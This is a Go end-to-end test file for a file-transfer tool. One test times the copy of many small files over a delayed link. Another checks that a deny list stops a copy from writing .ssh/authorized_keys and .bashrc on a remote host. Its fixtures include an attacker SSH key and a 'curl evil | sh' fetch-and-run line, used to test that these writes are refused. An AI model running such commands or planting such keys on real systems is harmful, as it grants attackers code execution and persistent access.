package tuie2e

import (
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

// A folder of many small files over a link with a long round trip.
//
// A file sent by itself costs several round trips: its part, the stream that
// reads it, the stream that writes it, its end and its commit. On a link of
// 50 ms that is about a third of a second a file, so 2,000 small files wait
// for over ten minutes and move their bytes in a second. The tree stream
// sends every small file of a folder in one stream each way. This test copies
// such a folder to build over a link whose far side answers 50 ms late, and
// holds the copy to a time a per-file copy cannot meet.
//
// TUIOS_E2E_SMALL_FILES sets the number of files (2,000 by default),
// TUIOS_E2E_SMALL_DELAY the delay in ms (50), and TUIOS_E2E_SMALL_BUDGET the
// budget in seconds, so the same test measures an older binary
// (TUIOS_E2E_BIN) with a budget it can meet.

// TestAFolderOfSmallFilesCopiesFastOverASlowLink copies a folder of small
// files to build through transfer-start, over a link with a 50 ms delay, and
// checks every file byte for byte, with its mode and time, on build.
//
// Negative control: with every file sent by itself (attemptDir puts the small
// files with the large ones), the copy takes far over the budget.
func TestAFolderOfSmallFilesCopiesFastOverASlowLink(t *testing.T) {
	n := 2000
	if v, err := strconv.Atoi(os.Getenv("TUIOS_E2E_SMALL_FILES")); err == nil && v > 0 {
		n = v
	}
	budget := 60 * time.Second
	if v, err := strconv.Atoi(os.Getenv("TUIOS_E2E_SMALL_BUDGET")); err == nil && v > 0 {
		budget = time.Duration(v) * time.Second
	}
	delayMs := 50
	if v, err := strconv.Atoi(os.Getenv("TUIOS_E2E_SMALL_DELAY")); err == nil && v >= 0 {
		delayMs = v
	}
	base := t.TempDir()
	remote := remoteMachine(t)
	hubWithFileHost(t, base, remote, writeDelayedFakeSSH(t, base, remote, 16<<20, 1<<20, delayMs))

	src := filepath.Join(base, "tree")
	bytes := makeSmallTree(t, src, n, 7)
	if os.Getenv("TUIOS_E2E_SMALL_NOEMPTY") != "" {
		// The engine before 2026-10 cannot copy an empty file in a folder,
		// so a measurement of it gives each a byte.
		filled := 0
		_ = filepath.WalkDir(src, func(p string, d fs.DirEntry, err error) error {
			if err == nil && d.Type().IsRegular() {
				if fi, ierr := d.Info(); ierr == nil && fi.Size() == 0 {
					_ = os.WriteFile(p, []byte("x"), fi.Mode().Perm())
					_ = os.Chtimes(p, fi.ModTime(), fi.ModTime())
					filled++
				}
			}
			return nil
		})
		bytes += int64(filled)
	}
	want := treeSums(t, src)

	c := dialFileVerbs(t, base)
	var row transferRow
	start := time.Now()
	c.must("transfer-start", map[string]any{
		"src": map[string]any{"path": src},
		"dst": map[string]any{"host": "build", "path": "~/tree"},
	}, &row)
	deadline := start.Add(budget + 10*time.Minute)
	for {
		row = transferNow(t, base, row.ID)
		if row.State == "done" || row.State == "failed" || row.State == "cancelled" {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("ASSERTION: the copy of %d files did not end in %v: %+v", n, time.Since(start), row)
		}
		time.Sleep(200 * time.Millisecond)
	}
	took := time.Since(start)
	if row.State != "done" {
		t.Fatalf("ASSERTION: the copy ended %s: %s %s", row.State, row.Code, row.Error)
	}
	sameTrees(t, "the folder on build", want, treeSums(t, filepath.Join(farHome(remote), "tree")))

	result := map[string]any{
		"files": n, "bytes": bytes, "delay_ms": delayMs, "ms": took.Milliseconds(),
		"files_per_second": float64(n) / took.Seconds(), "budget_s": budget.Seconds(),
		"binary": tuiosBin,
	}
	raw, _ := json.Marshal(result)
	t.Logf("small files: %s", raw)
	saveTransferArtifact(t, "cp-small-files-"+strconv.Itoa(n), result)
	if took > budget {
		t.Fatalf("ASSERTION: %d small files took %v over a %d ms link, over the budget of %v", n, took.Round(time.Millisecond), delayMs, budget)
	}
}

// TestATreeStreamKeepsToTheDenyList copies a folder whose files include
// .ssh/authorized_keys and .bashrc into build's home with tuios cp
// --contents, where build lets this machine write anywhere in its home
// (files_roots = ["~"]). The small files ride the tree stream. The plain files
// must land, and the two in the deny list must not, with the copy ending in
// exit 1 and naming why.
//
// Negative control: with takeTreeFile writing through a plain file system
// instead of linkWriteFS, authorized_keys lands on build.
func TestATreeStreamKeepsToTheDenyList(t *testing.T) {
	base := t.TempDir()
	remote := remoteMachine(t)
	hubWithFileHost(t, base, remote, writeFakeSSHTo(t, base, remote))
	src := filepath.Join(base, "dotfiles")
	files := map[string]string{
		"notes/todo.txt":       "plain\n",
		"readme.md":            "plain too\n",
		".ssh/authorized_keys": "ssh-ed25519 AAAA attacker\n",
		".bashrc":              "curl evil | sh\n",
	}
	for rel, body := range files {
		p := filepath.Join(src, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	far := farHome(remote)
	r := runTuios(t, base, "cp", "--json", "--contents", "--conflict", "replace", src, "build:~/")
	saveTransferArtifact(t, "cp-tree-deny", r)
	for _, rel := range []string{"notes/todo.txt", "readme.md"} {
		if got, err := os.ReadFile(filepath.Join(far, filepath.FromSlash(rel))); err != nil || string(got) != files[rel] {
			t.Fatalf("ASSERTION: %s did not land on build: %q %v\n%s", rel, got, err, r.Stdout)
		}
	}
	for _, rel := range []string{".ssh/authorized_keys", ".bashrc"} {
		if _, err := os.Stat(filepath.Join(far, filepath.FromSlash(rel))); err == nil {
			t.Fatalf("ASSERTION: a tree stream wrote %s on build", rel)
		}
	}
	if r.Code == 0 {
		t.Fatalf("ASSERTION: a copy that left denied files out exited 0\n%s", r.Stdout)
	}
	if !strings.Contains(r.Stdout, "forbidden") {
		t.Fatalf("ASSERTION: the copy does not say the files were refused: %s", r.Stdout)
	}
}
